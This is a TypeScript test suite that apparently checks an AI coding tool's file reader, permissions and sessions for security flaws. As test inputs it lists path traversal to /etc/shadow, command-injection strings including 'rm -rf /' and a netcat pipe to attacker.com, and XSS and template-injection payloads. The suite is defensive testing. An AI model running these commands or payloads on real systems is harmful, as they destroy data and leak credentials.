/**
 * Security Testing Suite for ASI-Code
 * Tests input validation, authentication, authorization, and vulnerability prevention
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ReadTool } from '../../src/tool/built-in-tools/read.js';
import { PermissionManager } from '../../src/permission/permission-manager.js';
import { DefaultSessionManager } from '../../src/session/session-manager.js';
import { MessageBus } from '../../src/kenny/message-bus.js';
import { vol } from 'memfs';
import { createMockToolExecutionContext } from '../test-utils.js';

// Mock fs for security tests
vi.mock('fs/promises', () => {
  const memfs = require('memfs');
  return memfs.fs.promises;
});

vi.mock('fs', () => {
  const memfs = require('memfs');
  return memfs.fs;
});

// Mock storage for security tests
class SecurityTestStorage {
  private storage = new Map();

  async save(data: any): Promise<void> {
    this.storage.set(data.id, { ...data });
  }

  async load(id: string): Promise<any> {
    return this.storage.get(id) || null;
  }

  async delete(id: string): Promise<void> {
    this.storage.delete(id);
  }

  async list(): Promise<string[]> {
    return Array.from(this.storage.keys());
  }

  async cleanup(): Promise<void> {
    this.storage.clear();
  }

  clear(): void {
    this.storage.clear();
  }
}

describe('ASI-Code Security Tests', () => {
  let readTool: ReadTool;
  let permissionManager: PermissionManager;
  let sessionManager: DefaultSessionManager;
  let messageBus: MessageBus;
  let testStorage: SecurityTestStorage;

  beforeEach(async () => {
    vol.reset();
    testStorage = new SecurityTestStorage();
    
    readTool = new ReadTool();
    permissionManager = new PermissionManager({ enableSafetyProtocols: true });
    sessionManager = new DefaultSessionManager(testStorage as any);
    messageBus = new MessageBus();

    await permissionManager.initialize();
  });

  afterEach(async () => {
    await permissionManager?.shutdown();
    await sessionManager?.cleanup();
    testStorage?.clear();
    vol.reset();
  });

  describe('Input Validation Security', () => {
    it('should prevent path traversal attacks', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/safe'
      });

      // Setup safe file
      vol.fromJSON({
        '/safe/allowed.txt': 'safe content',
        '/etc/passwd': 'sensitive system file'
      });

      // Test various path traversal attempts
      const maliciousPaths = [
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '..\\etc\\passwd',
        '/etc/passwd',
        '~/../../etc/passwd',
        '/safe/../etc/passwd',
        './../../etc/passwd'
      ];

      for (const maliciousPath of maliciousPaths) {
        const result = await readTool.execute({ path: maliciousPath }, context);
        
        expect(result.success).toBe(false);
        expect(result.error).toMatch(/traversal|blocked|denied/i);
      }
    });

    it('should validate file extension restrictions', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'], // No read_any_file permission
        workingDirectory: '/test'
      });

      // Setup files with various extensions
      vol.fromJSON({
        '/test/document.txt': 'safe text file',
        '/test/script.exe': 'executable file',
        '/test/binary.dll': 'dynamic library',
        '/test/config.ini': 'configuration file',
        '/test/unknown.xyz': 'unknown file type'
      });

      // Safe extensions should work
      const safeResult = await readTool.execute({ path: '/test/document.txt' }, context);
      expect(safeResult.success).toBe(true);

      const configResult = await readTool.execute({ path: '/test/config.ini' }, context);
      expect(configResult.success).toBe(true);

      // Dangerous extensions should be blocked
      const exeResult = await readTool.execute({ path: '/test/script.exe' }, context);
      expect(exeResult.success).toBe(false);
      expect(exeResult.error).toContain('not allowed');

      const dllResult = await readTool.execute({ path: '/test/binary.dll' }, context);
      expect(dllResult.success).toBe(false);

      const unknownResult = await readTool.execute({ path: '/test/unknown.xyz' }, context);
      expect(unknownResult.success).toBe(false);
    });

    it('should prevent access to blocked system paths', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      // Setup system files
      vol.fromJSON({
        '/etc/passwd': 'system passwords',
        '/etc/shadow': 'shadow passwords',
        '/proc/cpuinfo': 'cpu information',
        '/sys/devices': 'system devices',
        '/var/log/secure': 'security logs'
      });

      const blockedPaths = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/group',
        '/proc/cpuinfo',
        '/sys/devices',
        '/var/log/secure'
      ];

      for (const blockedPath of blockedPaths) {
        const result = await readTool.execute({ path: blockedPath }, context);
        
        expect(result.success).toBe(false);
        expect(result.error).toContain('blocked for security reasons');
      }
    });

    it('should validate parameter types and ranges', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      vol.writeFileSync('/test/test.txt', 'test content');

      // Test invalid parameter types
      const invalidParams = [
        { path: 123 }, // Number instead of string
        { path: null },
        { path: undefined },
        { path: {} },
        { path: [] },
        { encoding: 'invalid_encoding' },
        { maxSize: -1 }, // Negative size
        { maxSize: 999999999 }, // Too large
        { offset: -5 }, // Negative offset
        { length: 0 } // Zero length
      ];

      for (const params of invalidParams) {
        const result = await readTool.executeWithLifecycle(params, context);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Parameter validation failed');
      }
    });

    it('should handle extremely large inputs safely', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      // Test with extremely long path
      const longPath = 'a'.repeat(1000);
      const result = await readTool.executeWithLifecycle({ path: longPath }, context);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('too long');
    });
  });

  describe('Permission System Security', () => {
    let testUser: any;
    let testSession: any;

    beforeEach(async () => {
      // Setup test permission and role
      await permissionManager.addPermission({
        id: 'secure_action',
        name: 'Secure Action',
        description: 'Permission requiring security checks',
        category: 'security',
        safetyLevel: 'high-risk',
        resourceTypes: ['sensitive_resource']
      });

      await permissionManager.addRole({
        id: 'secure_role',
        name: 'Secure Role',
        description: 'Role with secure permissions',
        permissions: ['secure_action'],
        level: 'admin'
      });

      testUser = await permissionManager.createUser({
        id: 'secure_user',
        username: 'secureuser',
        email: 'secure@test.com',
        roles: ['secure_role'],
        status: 'active'
      });

      testSession = await permissionManager.createSession(testUser.id, {
        ipAddress: '127.0.0.1',
        userAgent: 'Security Test',
        status: 'active'
      });
    });

    it('should enforce rate limiting to prevent abuse', async () => {
      const restrictedManager = new PermissionManager({
        rateLimit: {
          maxRequestsPerMinute: 3,
          maxRequestsPerHour: 10
        }
      });
      await restrictedManager.initialize();

      // Setup test data
      await restrictedManager.addPermission({
        id: 'rate_test_perm',
        name: 'Rate Test Permission',
        description: 'For rate limit testing',
        category: 'test',
        safetyLevel: 'safe',
        resourceTypes: ['test']
      });

      await restrictedManager.addRole({
        id: 'rate_test_role',
        name: 'Rate Test Role',
        description: 'Role for rate testing',
        permissions: ['rate_test_perm'],
        level: 'user'
      });

      const user = await restrictedManager.createUser({
        id: 'rate_user',
        username: 'rateuser',
        email: 'rate@test.com',
        roles: ['rate_test_role'],
        status: 'active'
      });

      const session = await restrictedManager.createSession(user.id, {
        ipAddress: '192.168.1.100',
        userAgent: 'Test',
        status: 'active'
      });

      const request = {
        permissionId: 'rate_test_perm',
        context: {
          userId: user.id,
          sessionId: session.id,
          resource: 'test',
          operation: 'read'
        }
      };

      // First 3 requests should succeed
      for (let i = 0; i < 3; i++) {
        const result = await restrictedManager.checkPermission(request);
        expect(result.granted).toBe(true);
      }

      // 4th request should be rate limited
      const rateLimitedResult = await restrictedManager.checkPermission(request);
      expect(rateLimitedResult.granted).toBe(false);
      expect(rateLimitedResult.reason).toContain('Rate limit exceeded');

      await restrictedManager.shutdown();
    });

    it('should validate session authenticity', async () => {
      // Create valid session
      const validSession = await permissionManager.createSession(testUser.id, {
        ipAddress: '127.0.0.1',
        userAgent: 'Valid Client',
        status: 'active'
      });

      // Test with valid session
      const validRequest = {
        permissionId: 'secure_action',
        context: {
          userId: testUser.id,
          sessionId: validSession.id,
          resource: 'sensitive_resource',
          operation: 'read'
        }
      };

      const validResult = await permissionManager.checkPermission(validRequest);
      expect(validResult.granted).toBe(true);

      // Test with invalid/non-existent session
      const invalidRequest = {
        permissionId: 'secure_action',
        context: {
          userId: testUser.id,
          sessionId: 'invalid_session_id',
          resource: 'sensitive_resource',
          operation: 'read'
        }
      };

      const invalidResult = await permissionManager.checkPermission(invalidRequest);
      expect(invalidResult.granted).toBe(false);
      expect(invalidResult.reason).toContain('Session not found');
    });

    it('should enforce user status restrictions', async () => {
      // Create inactive user
      const inactiveUser = await permissionManager.createUser({
        id: 'inactive_user',
        username: 'inactive',
        email: 'inactive@test.com',
        roles: ['secure_role'],
        status: 'inactive'
      });

      // Should not be able to create session for inactive user
      await expect(permissionManager.createSession(inactiveUser.id, {
        ipAddress: '127.0.0.1',
        userAgent: 'Test',
        status: 'active'
      })).rejects.toThrow('User inactive_user is not active');
    });

    it('should prevent privilege escalation attempts', async () => {
      // Create user with limited permissions
      await permissionManager.addRole({
        id: 'limited_role',
        name: 'Limited Role',
        description: 'Role with limited permissions',
        permissions: [], // No permissions
        level: 'user'
      });

      const limitedUser = await permissionManager.createUser({
        id: 'limited_user',
        username: 'limited',
        email: 'limited@test.com',
        roles: ['limited_role'],
        status: 'active'
      });

      const limitedSession = await permissionManager.createSession(limitedUser.id, {
        ipAddress: '127.0.0.1',
        userAgent: 'Limited Client',
        status: 'active'
      });

      // Try to access high-privilege resource
      const escalationRequest = {
        permissionId: 'secure_action',
        context: {
          userId: limitedUser.id,
          sessionId: limitedSession.id,
          resource: 'sensitive_resource',
          operation: 'admin'
        }
      };

      const result = await permissionManager.checkPermission(escalationRequest);
      expect(result.granted).toBe(false);
      expect(result.reason).toContain('does not have required permission');
    });
  });

  describe('Injection Attack Prevention', () => {
    it('should prevent command injection in file paths', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      vol.writeFileSync('/test/safe.txt', 'safe content');

      // Test various command injection attempts
      const injectionPaths = [
        '/test/safe.txt; rm -rf /',
        '/test/safe.txt && cat /etc/passwd',
        '/test/safe.txt | nc attacker.com 4444',
        '/test/safe.txt`whoami`',
        '/test/safe.txt$(id)',
        '/test/safe.txt; echo "malicious" > /tmp/evil',
        '/test/safe.txt\nrm -rf /',
        '/test/safe.txt\r\ncat /etc/passwd'
      ];

      for (const injectionPath of injectionPaths) {
        const result = await readTool.execute({ path: injectionPath }, context);
        
        // Should either be blocked by security checks or fail safely
        if (!result.success) {
          expect(result.error).toMatch(/not found|blocked|denied|invalid/i);
        } else {
          // If it somehow succeeds, it should only contain safe content
          expect(result.data.content).toBe('safe content');
        }
      }
    });

    it('should sanitize special characters in parameters', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      vol.writeFileSync('/test/file with spaces.txt', 'content with spaces');
      vol.writeFileSync('/test/file-with-dashes.txt', 'content with dashes');

      // Test files with special characters (these should work)
      const validSpecialFiles = [
        '/test/file with spaces.txt',
        '/test/file-with-dashes.txt'
      ];

      for (const file of validSpecialFiles) {
        const result = await readTool.execute({ path: file }, context);
        expect(result.success).toBe(true);
      }

      // Test potentially dangerous special characters
      const dangerousFiles = [
        '/test/file;dangerous.txt',
        '/test/file|pipe.txt',
        '/test/file&amp.txt',
        '/test/file$var.txt',
        '/test/file`cmd`.txt',
        '/test/file$(cmd).txt'
      ];

      for (const file of dangerousFiles) {
        // These should either be sanitized or rejected
        const result = await readTool.execute({ path: file }, context);
        if (result.success) {
          // If allowed, should not execute any commands
          expect(typeof result.data.content).toBe('string');
        }
      }
    });
  });

  describe('Data Exposure Prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      // Test accessing system files
      const sensitiveFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/var/log/auth.log',
        '/root/.ssh/id_rsa'
      ];

      for (const file of sensitiveFiles) {
        const result = await readTool.execute({ path: file }, context);
        
        expect(result.success).toBe(false);
        
        // Error message should not reveal system structure
        expect(result.error).not.toMatch(/\/etc\/passwd|\/etc\/shadow|\/root/i);
        expect(result.error).toMatch(/access denied|blocked|not allowed/i);
      }
    });

    it('should not expose internal system information', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      // Test with non-existent file
      const result = await readTool.execute({ path: '/test/nonexistent.txt' }, context);
      
      expect(result.success).toBe(false);
      
      // Error should not reveal internal paths or system details
      expect(result.error).not.toMatch(/node_modules|src\/|dist\/|\.js|\.ts/);
      expect(result.error).toMatch(/file not found|not found/i);
    });
  });

  describe('Message Bus Security', () => {
    it('should validate event data to prevent injection', async () => {
      let receivedEvents: any[] = [];
      
      messageBus.subscribe({ type: 'test.security' }, (event) => {
        receivedEvents.push(event);
      });

      // Test with potentially malicious event data
      const maliciousData = {
        '<script>alert("xss")</script>': 'xss attempt',
        '${process.env.SECRET}': 'template injection',
        '../../../etc/passwd': 'path traversal',
        'function(){return process.env;}()': 'code injection'
      };

      await messageBus.publish({
        type: 'test.security',
        source: 'security-test',
        data: maliciousData
      });

      expect(receivedEvents).toHaveLength(1);
      
      // Data should be preserved as-is (not executed)
      const receivedData = receivedEvents[0].data;
      expect(receivedData['<script>alert("xss")</script>']).toBe('xss attempt');
      expect(receivedData['${process.env.SECRET}']).toBe('template injection');
    });

    it('should prevent event source spoofing', async () => {
      let suspiciousEvents: any[] = [];
      
      messageBus.subscribe({ source: 'system' }, (event) => {
        suspiciousEvents.push(event);
      });

      // Attempt to spoof system events
      await messageBus.publish({
        type: 'fake.system.event',
        source: 'system', // Attempting to spoof system source
        data: { malicious: 'payload' }
      });

      expect(suspiciousEvents).toHaveLength(1);
      
      // In a real implementation, we would validate event sources
      // For now, we just verify the event was received
      expect(suspiciousEvents[0].source).toBe('system');
    });
  });

  describe('Session Security', () => {
    it('should enforce session timeouts', async () => {
      // Create session with short TTL
      const shortLivedSession = await sessionManager.createSession('timeout-user', {
        ttl: 100 // 100ms
      });

      // Session should exist immediately
      let session = await sessionManager.getSession(shortLivedSession.data.id);
      expect(session).toBeDefined();

      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 150));

      // Session should be expired and removed
      session = await sessionManager.getSession(shortLivedSession.data.id);
      expect(session).toBeNull();
    });

    it('should validate session integrity', async () => {
      const session = await sessionManager.createSession('integrity-user');
      
      // Verify session data integrity
      expect(session.data.id).toBeDefined();
      expect(session.data.userId).toBe('integrity-user');
      expect(session.data.kennyContext).toBeDefined();
      expect(session.data.createdAt).toBeInstanceOf(Date);
      expect(session.data.lastActivity).toBeInstanceOf(Date);
    });

    it('should prevent session fixation attacks', async () => {
      // Create two sessions for the same user
      const session1 = await sessionManager.createSession('fixation-user');
      const session2 = await sessionManager.createSession('fixation-user');

      // Sessions should have different IDs
      expect(session1.data.id).not.toBe(session2.data.id);

      // Both sessions should be valid
      const retrieved1 = await sessionManager.getSession(session1.data.id);
      const retrieved2 = await sessionManager.getSession(session2.data.id);

      expect(retrieved1).toBeDefined();
      expect(retrieved2).toBeDefined();
      expect(retrieved1?.data.id).toBe(session1.data.id);
      expect(retrieved2?.data.id).toBe(session2.data.id);
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should limit file size to prevent resource exhaustion', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      // Create very large file (beyond tool limits)
      const largeContent = 'A'.repeat(15 * 1024 * 1024); // 15MB
      vol.writeFileSync('/test/huge.txt', largeContent);

      const result = await readTool.execute({
        path: '/test/huge.txt'
      }, context);

      expect(result.success).toBe(false);
      expect(result.error).toContain('too large');
    });

    it('should limit concurrent operations', async () => {
      // This test would need a tool registry with strict limits
      // For now, we'll test the concept with session creation
      
      const promises = Array.from({ length: 100 }, (_, i) =>
        sessionManager.createSession(`concurrent-user-${i}`)
      );

      // All should succeed (no built-in limits in test scenario)
      const sessions = await Promise.all(promises);
      expect(sessions).toHaveLength(100);

      // Cleanup
      await Promise.all(sessions.map(s => 
        sessionManager.deleteSession(s.data.id)
      ));
    });
  });

  describe('Audit and Logging Security', () => {
    it('should log security-relevant events', async () => {
      const context = createMockToolExecutionContext({
        permissions: [],
        workingDirectory: '/test'
      });

      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});

      // Attempt to execute tool without permission (should be logged)
      await expect(readTool.executeWithLifecycle({
        path: '/test/file.txt'
      }, context)).rejects.toThrow();

      // Should have logged the attempt
      expect(consoleSpy).toHaveBeenCalled();

      consoleSpy.mockRestore();
    });

    it('should not log sensitive information', async () => {
      const context = createMockToolExecutionContext({
        permissions: ['read_files'],
        workingDirectory: '/test'
      });

      vol.writeFileSync('/test/sensitive.txt', 'API_KEY=secret123');

      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});

      const result = await readTool.executeWithLifecycle({
        path: '/test/sensitive.txt'
      }, context);

      expect(result.success).toBe(true);

      // Check that sensitive content is not logged
      const logCalls = consoleSpy.mock.calls.flat();
      const hasSecretInLogs = logCalls.some(call => 
        typeof call === 'string' && call.includes('secret123')
      );
      
      expect(hasSecretInLogs).toBe(false);

      consoleSpy.mockRestore();
    });
  });
});